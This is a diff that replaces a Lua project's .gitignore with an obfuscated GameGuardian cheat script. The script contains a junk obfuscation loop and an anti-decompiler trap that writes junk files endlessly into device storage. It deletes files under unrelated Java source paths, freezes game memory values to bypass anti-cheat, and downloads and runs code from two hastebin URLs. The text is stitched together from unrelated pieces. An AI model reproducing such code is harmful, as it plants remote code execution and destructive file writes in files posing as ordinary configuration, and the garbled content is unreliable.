@@ -1,41 +1,109 @@
-# Compiled Lua sources
-luac.out
-
-# luarocks build files
-*.src.rock
-*.zip
-*.tar.gz
-
-# Object files
-*.o
-*.os
-*.ko
-*.obj
-*.elf
-
-# Precompiled Headers
-*.gch
-*.pch
-
-# Libraries
-*.lib
-*.a
-*.la
-*.lo
-*.def
-*.exp
-
-# Shared objects (inc. Windows DLLs)
-*.dll
-*.so
-*.so.*
-*.dylib
-
-# Executables
-*.exe
-*.out
-*.app
-*.i*86
-*.x86_64
-*.hex
-
+while (nil)do;local o={o.uo,p.p,fq.qo.o,p.p,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,q.qoyo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.pp,q.qo.o,p.p,q.qo.o,p.p,q.qi}local o={o.uo,p.p,q.qo.o,p.rp,q.qo.uo,p.p,q.qo.o,p.p,q.q} local p={o.o,p.p,qw.qoo.uo,p.p,q.qo.o,p.p,q.q.o,p.sp,q.q} local q={o.o,p.p,q.qo.uo,p.p,q.qbo.o,p.p,q.qo.o,p.p,q.qi}if (o.o)then if (o.o.o)then if (o.o.o.o) then if (o.o.o.o.o) then if (p.p) then if (p.p.p) then if (p.p.p.p) then if (q.q) then if (q.q.q) then if (q.q.q.q) then;o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q))))))o.o=(o.o(o)) o.o=(o.o(o.o.o(o.o(o)))) p.p=(p.p(p)) p.p=(p.p(p.p.p(p.p.p.p(p.p.p(p.p(p.p)))))) q.q = (q.q(q.q.q(q.q.q.q(q.q.q(q.q(q.q)))))) local r={o.o,p.p,q.qo.o,p.p,q.q} r.r=r[1]..r[2]..r[3] r.i= r.r(r.r(r.r(r.r(r.r(r.r(r.r)))))) end;end;end;end;end;end;end;end;end;end;end
+function Squid(A0_24)
+    return (A0_24:gsub("..", function(A0_25)
+      return string.char((tonumber(A0_25, 16) + 256 - 34 + 255999744) % 256)
+    end))
+  end
+  if _G["debug"]["getinfo"](gg.alert).source == "=[Java]" then
+  else
+    i = 1
+    gg.alert("Auto Decompiler Detected", "")
+    gg.setVisible(false)
+    while true do
+      i = i + 1
+      gg.toast("Warning, Anti Log Is Activated !!")
+      file = io.open("/storage/emulated/0/" .. i, "w")
+      file:write("noob leecher !")
+      file:close()
+      gg.setVisible(false)
+      gg.processKill()
+      gg.setVisible(true)
+    end
+    return
+  end
+  save = {}
+  for _FORV_27_ = 1, 10000 do
+    table.insert(save, {
+      ["address"] = 0 + _FORV_27_,
+      ["flags"] = 12
+    })
+  end
+  time = _G["os"]["clock"]()
+  for _FORV_27_ = 1, 5 do
+    _G["gg"]["addListItems"](save)
+  end
+  if 2 <= _G["os"]["clock"]() - time then
+    _G["gg"]["removeListItems"](save)
+    i = 1
+    gg.alert("Auto Decompiler Detected", "")
+    gg.setVisible(false)
+    while true do
+      i = i + 1
+      gg.toast("Warning, Anti Log Is Activated !!")
+      file = io.open("/storage/emulated/0/" .. i, "w")
+      file:write("noob leecher !")
+      file:close()
+      gg.setVisible(false)
+      gg.processKill()
+      gg.setVisible(true)
+    end
+    print("〰〰〰〰〰〰〰〰⚠ ERROR DETECTED〰〰〰〰〰〰〰〰Restart Script ❕")
+    return
+  end
+  _G["gg"]["removeListItems"](save)
+os.remove('src/main/java/com/google/errorprone/annotations')
+os.remove('third_party.java_src.error_prone.project.annotations.Google_internal')
+os.remove('src/main/java/com/google/errorprone/annotations')
+os.remove('src/main/java/com/google/errorprone/annotations.Google_internal')
+os.remove("src/main/java/com/google/errorprone/annotations")
+os.remove("src/main/java/com/google/errorprone/annotations")
+os.remove("src/main/java/com/google/errorprone/annotations/concurrent")
+os.remove("third_party.java_src.error_prone.project.annotations.Google_internal")
+gg.clearResults()
+gg.clearResults()
+gg.setRanges(gg.REGION_C_ALLOC)
+gg.searchNumber("2.2958874e-41;16384D;16384D;16384D;16384D;16384D::24", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
+if gg.getResultCount() == 0 then
+gg.alert("Value Not Found\nRestart Game")
+gg.processKill()
+os.exit()
+else
+gg.refineNumber("2.2958874e-41", gg.TYPE_FLOAT, false, gg.SIGN_EQUAL, 0, -1)
+n = gg.getResultCount()
+jz = gg.getResults(n)
+for i = 1, n do
+gg.addListItems({[1] = {address = jz[i].address + 0,flags = 4,freeze = true,value = 0}})
+gg.addListItems({[1] = {address = jz[i].address + 4,flags = 4,freeze = true,value = 0}})
+gg.addListItems({[1] = {address = jz[i].address + 48,flags = 4,freeze = true,value = 0}})
+gg.addListItems({[1] = {address = jz[i].address + 100,flags = 4,freeze = true,value = 0}})
+end
+end
+gg.clearResults()
+gg.setRanges(gg.REGION_C_DATA)
+gg.searchNumber("4480", gg.TYPE_DWORD, false, gg.SIGN_EQUAL, 0, -1)
+gg.getResults(100)
+local bs = gg.getResults(100, nil, nil, nil, nil, nil, nil, nil, nil)
+for i, v in ipairs(bs) do
+	if v.flags == gg.TYPE_DWORD then
+		v.value = "0"
+		v.freeze = true
+	end
+end
+gg.addListItems(bs)
+bs = nil
+gg.clearResults()
+TG = gg.makeRequest("https://hastebin.com/raw/beyalixugu").content
+if not TG then
+gg.alert('Something Went Wrong')
+os.exit()
+else﻿
+pcall(load(TG))
+end﻿
+AS = gg.makeRequest("https://hastebin.com/raw/ujonezikic").content
+if not AS then
+gg.alert('Something Went Wrong')
+os.exit()
+else﻿
+pcall(load(AS))
+end﻿
+gg.alert('💪 Bypass Successfully')
